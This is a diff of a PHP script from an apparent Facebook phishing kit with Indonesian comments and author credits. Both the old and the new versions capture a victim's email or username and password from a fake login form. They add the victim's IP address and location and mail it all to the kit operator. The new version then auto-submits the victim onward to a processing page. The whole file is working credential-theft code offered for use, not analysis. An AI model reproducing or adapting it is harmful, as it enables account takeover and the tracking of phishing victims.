@@ -1,45 +1,87 @@
-<!-- Reedit by Jefanya Efandchris
-Don't change copyright, you are idiot -->
-
 <?php
-$user = $_POST['email'];
-$pass = $_POST['password'];
-$ip = $_SERVER['REMOTE_ADDR'];
-
-$subject = "SETORAN FACEBOOK LAGI BOS";
-$message = '
-<center>
- <div style="background: url(https://coverfiles.alphacoders.com/431/43135.png) no-repeat center center fixed;border:2px solid black;background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
-</div>
- <table border="1" style="border-radius:8px; border:4px solid black; border-collapse:collapse;width:100%;background:linear-gradient(90deg,gold,orange);">
-    <tr>
-      <th style="width:22%;height:25px;text-align:left;">Email</th>
-      <th style="width:70%;text-align:center;">'.$user.'</th>
-    </tr>
-    <tr>
-       <th style="width:22%;height:25px;text-align:left;">Pass</th>
-      <th style="width:70%;text-align:center;">'.$pass.'</th>
-    </tr>
-    <tr>
-       <th style="width:22%;height:25px;text-align:left;">IP</th>
-      <th style="width:70%;text-align:center;">'.$ip.'</th>
-    </tr>
-  </table>
-  <div style="border:2px solid black;width: 294; font-weight:bold; height: 20px; background: linear-gradient(90deg,gold,orange); color: black; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
-<div style="font-weight:bold;font-size:15px;">&copy; JEFANYA EFANDCHRIS</div>
-</div>
- <center>
-';
+// MENGAMBIL KONTROL
+include 'system/setting.php';
 include 'email.php';
-$headersx  = 'MIME-Version: 1.0' . "\r\n";
-$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-$headersx .= 'From: JEFANYA - FB GIVEAWAY V1 <result@jefanya.store>' . "\r\n";
-$datamail = mail($emailku, $subject, $message, $headersx);
+
+// MENANGKAP DATA YANG DI-INPUT
+$email = $_POST['email'];
+$password = $_POST['password'];
+
+if($email == "" && $password == ""){
+header("Location: index.php");
+}else{
+
+$subjek = "$arpantek_flag | $arpantek_callingcode | PUNYA SI $email | LOGIN $login";
+$pesan = '
+<center> 
+<div style="background: url(https://pbs.twimg.com/media/Efw4vTuUwAAvmp6.jpg) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
+<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
+<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
+<tr>
+<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
+<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
+</tr>
+<tr>
+<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
+<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
+</tr>
+</table>
+<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Tambahan</div>
+<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
+<tr>
+<th style="width: 22%; text-align: left;" height="25px"><b>IP ADDRESS</th>
+<th style="width: 78%; text-align: center;"><b>'.$arpantek_ip_address.'</th> 
+</tr>
+<tr>
+<th style="width: 22%; text-align: left;" height="25px"><b>CONTINENT</th>
+<th style="width: 78%; text-align: center;"><b>'.$arpantek_continent.'</th> 
+</tr>
+<tr>
+<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
+<th style="width: 78%; text-align: center;"><b>'.$arpantek_country.'</th> 
+</tr>
+<tr>
+<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
+<th style="width: 78%; text-align: center;"><b>'.$arpantek_region.'</th> 
+</tr>
+<tr>
+<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
+<th style="width: 78%; text-align: center;"><b>'.$arpantek_city.'</th> 
+</tr>
+<tr>
+<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
+<th style="width: 78%; text-align: center;"><b>'.$arpantek_latitude.'</th> 
+</tr>
+<tr>
+<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
+<th style="width: 78%; text-align: center;"><b>'.$arpantek_longitude.'</th> 
+</tr>
+<tr>
+<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
+<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
+</tr>
+</table>
+<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
+<div style="float: left; margin-top: 3%;">
+Temukan saya:
+</div>
+<div style="float: right;">
+<a href="https://t.me/jefanyastore"><img style="margin: 5px;" width="30" src="https://i.postimg.cc/nrv55rRD/image.png"></a>
+</div>
+</div>
+</center>
+';
+$headers  = 'MIME-Version: 1.0' . "\r\n";
+$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+$headers .= ''.$sender.'' . "\r\n";
+$kirim = mail($emailku, $subjek, $pesan, $headers);
+
+// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
+if($kirim) {
+echo "<form id='arpantek' method='POST' action='processing.php'>
+<input type='hidden' name='email' value='$email'>
+</form>
+<script type='text/javascript'>document.getElementById('arpantek').submit();</script>";
+}
+}
 ?>
-<html>
-<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<meta http-equiv="REFRESH" content="0;url=https://chat.whatsapp.com/IHT9HZguYzE7CKEQC5Cjg7">
-</head>
-<body>
-</body>
-</html>
